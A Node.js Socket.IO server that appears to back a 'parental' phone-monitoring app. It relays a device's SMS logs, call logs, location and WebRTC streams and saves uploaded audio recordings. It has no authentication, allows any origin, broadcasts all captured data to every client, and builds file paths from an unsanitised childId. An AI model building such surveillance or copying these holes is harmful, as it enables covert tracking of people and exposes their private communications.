const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");
const fs = require("fs");

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// Serve static frontend
app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());

// Store child data in memory (or DB in future)
let childData = {};

// --- Socket.IO connections ---
io.on("connection", (socket) => {
    console.log("Parent dashboard connected:", socket.id);

    // Register child
    socket.on("register", (data) => {
        console.log("Child registered:", data);
        const { childId } = data;
        childData[childId] = { socketId: socket.id };
        io.emit("child-list", Object.keys(childData));
    });

    // Handle child sending SMS logs
    socket.on("sms-log", (data) => {
        console.log("SMS:", data);
        io.emit("sms-log", data); // broadcast to parent dashboard
    });

    // Call logs
    socket.on("call-log", (data) => {
        console.log("Call:", data);
        io.emit("call-log", data);
    });

    // Location updates
    socket.on("location-update", (data) => {
        console.log("Location:", data);
        io.emit("location-update", data);
    });

    // WebRTC signaling (offer/answer/ice)
    socket.on("offer", (data) => {
        console.log("Offer from child:", data);
        io.emit("offer", data);
    });
    socket.on("answer", (data) => {
        console.log("Answer from child:", data);
        io.emit("answer", data);
    });
    socket.on("ice-candidate", (data) => {
        io.emit("ice-candidate", data);
    });

    socket.on("disconnect", () => {
        console.log("Socket disconnected:", socket.id);
    });
});

// Optional: Save audio blob
app.post("/upload-audio", (req, res) => {
    const { childId, audioBase64 } = req.body;
    const audioBuffer = Buffer.from(audioBase64, "base64");
    const filename = `recordings/${childId}_${Date.now()}.webm`;
    fs.writeFileSync(filename, audioBuffer);
    res.json({ status: "ok", file: filename });
});

// Start server
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
